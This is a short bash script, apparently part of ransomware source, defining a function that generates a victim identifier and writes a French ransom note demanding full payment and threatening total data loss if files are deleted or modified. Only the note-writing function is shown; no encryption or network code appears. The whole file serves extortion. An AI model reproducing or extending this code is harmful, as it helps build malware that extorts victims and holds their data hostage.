#!/bin/bash

create_ransom_note() {
    id=$(uuidgen)
    echo -e "Identifiant : $id \nVeuillez payer l'intégralité de la somme. \nNe tentez en aucun cas de supprimer ou modifier des fichiers cela entrainerais la perte total de vos données." > ransom_note.txt
}
